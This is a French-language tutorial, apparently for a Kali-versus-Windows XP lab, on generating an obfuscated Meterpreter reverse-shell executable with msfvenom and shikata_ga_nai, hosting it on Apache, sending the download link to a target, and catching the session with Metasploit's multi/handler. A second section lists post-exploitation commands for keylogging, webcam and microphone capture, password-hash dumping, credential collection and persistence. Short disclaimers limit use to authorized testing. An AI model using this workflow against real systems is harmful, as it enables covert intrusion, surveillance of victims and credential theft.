## Prérequis : 
**Windows xp : https://archive.org/details/WinXPSP2HomeEditionFrench**  
**Kali Linux : https://www.kali.org/get-kali/#kali-platforms**

### Étape 1 : **Afficher les exploits disponibles dans Metasploit**
1. **Lancer Metasploit** :
   ```bash
   msfconsole
   ```

2. **Afficher la liste des exploits disponibles** :
   ```bash
   show exploits
   ```
   - Parcourez la liste et choisissez l'exploit souhaité. Pour un simple handler pour reverse shell, on utilise `exploit/multi/handler`.

### Étape 2 : **Créer le payload encodé avec `shikata_ga_nai`**
1. **Afficher les payloads disponibles avec `msfvenom`** :
   ```bash
   msfvenom --list payloads
   ```
   - Choisissez le payload approprié, par exemple `windows/meterpreter/reverse_tcp`.

2. **Créer le payload avec encodage** :
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<votre_IP> LPORT=<votre_port> -e x86/shikata_ga_nai -i 5 -f exe > payload_encoded.exe
   ```
   - **Explication des options** :
     - `-p windows/meterpreter/reverse_tcp` : Payload pour un reverse shell Meterpreter.
     - `LHOST` : Adresse IP de votre machine attaquante.
     - `LPORT` : Port d'écoute sur votre machine.
     - `-e x86/shikata_ga_nai` : Utilisation de l'encodeur `shikata_ga_nai`.
     - `-i 5` : Nombre d'itérations d'encodage pour augmenter l'obfuscation.
     - `-f exe` : Format du fichier de sortie.

### Étape 3 : **Configurer le listener dans Metasploit**
1. **Sélectionner l'exploit `multi/handler`** :
   ```bash
   use exploit/multi/handler
   ```

2. **Afficher les options disponibles pour l'exploit** :
   ```bash
   show options
   ```

3. **Configurer les options du payload** :
   ```bash
   set payload windows/meterpreter/reverse_tcp
   set LHOST <votre_IP>
   set LPORT <votre_port>
   show options
   ```
   - Vérifiez que toutes les options sont correctement configurées.

4. **Lancer l'exploit** :
   ```bash
   exploit
   ```

### Étape 4 : **Partager le payload via un serveur web**
1. **Copier le payload dans le répertoire du serveur web** :
   ```bash
   cp payload_encoded.exe /var/www/html/
   ```

2. **Vérifier le statut du serveur Apache** :
   ```bash
   service apache2 status
   ```
   - Si le serveur n'est pas démarré, utilisez :
     ```bash
     service apache2 start
     ```

3. **Vérifier l'accès au payload** :
   Accédez au lien suivant depuis un navigateur ou utilisez `curl` :
   ```bash
   curl http://<votre_IP>/payload_encoded.exe
   ```

### Étape 5 : **Partager le lien de téléchargement**
Envoyez le lien à la cible pour télécharger le payload :
```text
http://<votre_IP>/payload_encoded.exe
```

### Étape 6 : **Attendre l'exécution et capturer la session Meterpreter**
Une fois que le payload est exécuté sur la machine cible, la session `meterpreter` sera automatiquement ouverte dans Metasploit, permettant l'interaction avec la cible.

### **Note Importante** :
Cette procédure est réservée aux tests de pénétration éthiques et autorisés sur des systèmes pour lesquels vous avez obtenu la permission. Toute utilisation non autorisée est illégale et contraire à l'éthique.






Une fois que le payload a été installé et que la session `meterpreter` est ouverte sur la machine cible, voici une liste des commandes que vous pouvez utiliser dans Metasploit pour interagir avec la session :

### Commandes de base `meterpreter`
1. **`help`** : Affiche toutes les commandes disponibles.
2. **`sysinfo`** : Affiche les informations système de la machine cible.
3. **`getuid`** : Affiche l'utilisateur actuellement utilisé sur la machine cible.
4. **`getpid`** : Affiche le PID (Process ID) du processus `meterpreter`.
5. **`ps`** : Liste les processus en cours sur la machine cible.
6. **`shell`** : Ouvre un shell Windows sur la machine cible.
7. **`exit`** : Ferme la session `meterpreter`.

### Commandes de gestion de fichiers
1. **`ls`** : Liste les fichiers et dossiers du répertoire courant.
2. **`cd <chemin>`** : Change de répertoire.
3. **`pwd`** : Affiche le répertoire courant.
4. **`download <fichier>`** : Télécharge un fichier de la machine cible vers la machine attaquante.
5. **`upload <fichier>`** : Envoie un fichier de la machine attaquante vers la machine cible.
6. **`rm <fichier>`** : Supprime un fichier sur la machine cible.
7. **`mkdir <dossier>`** : Crée un nouveau dossier sur la machine cible.

### Commandes de gestion de processus
1. **`kill <PID>`** : Tue un processus spécifique sur la machine cible.
2. **`migrate <PID>`** : Migre le `meterpreter` vers un autre processus (utile pour la persistance).

### Commandes de contrôle de session
1. **`background`** : Met la session `meterpreter` en arrière-plan.
2. **`sessions`** : Liste toutes les sessions actives.
3. **`sessions -i <ID>`** : Interagit avec une session spécifique.

### Commandes réseau
1. **`portfwd add -l <port_local> -p <port_distant> -r <IP_cible>`** : Ajoute un port forwarding.
2. **`ifconfig`** : Affiche les interfaces réseau de la machine cible.
3. **`route`** : Gère et affiche les routes sur la machine cible.
4. **`arp`** : Affiche la table ARP de la machine cible.

### Commandes de capture et de surveillance
1. **`screenshot`** : Prend une capture d'écran de la machine cible.
2. **`webcam_list`** : Liste les webcams disponibles sur la machine cible.
3. **`webcam_snap`** : Prend une photo avec la webcam.
4. **`record_mic`** : Enregistre le micro pendant une durée définie.
5. **`keyscan_start`** : Démarre l'enregistrement des frappes de touches (keylogging).
6. **`keyscan_dump`** : Affiche les frappes enregistrées.
7. **`keyscan_stop`** : Arrête l'enregistrement des frappes.

### Commandes de persistance et d'exploitation avancée
1. **`run persistence -h`** : Affiche les options pour configurer la persistance sur la machine cible.
2. **`run getsystem`** : Tente de passer en tant qu'utilisateur `SYSTEM`.
3. **`hashdump`** : Extrait les hachages de mots de passe (nécessite des privilèges élevés).
4. **`run post/windows/gather/credentials/credentials_collector`** : Collecte les informations d'identification de la machine cible.

### Commandes de gestion de l'écran et de la webcam
1. **`webcam_stream`** : Diffuse un flux vidéo en direct de la webcam de la cible.
2. **`screenshare`** : Partage l'écran en temps réel.

### **Conseil de Sécurité**
Ces commandes doivent être utilisées dans le cadre de tests de pénétration éthiques, et uniquement avec l'autorisation explicite des propriétaires des systèmes ciblés. Toute utilisation non autorisée de ces techniques est illégale et contraire à l'éthique.
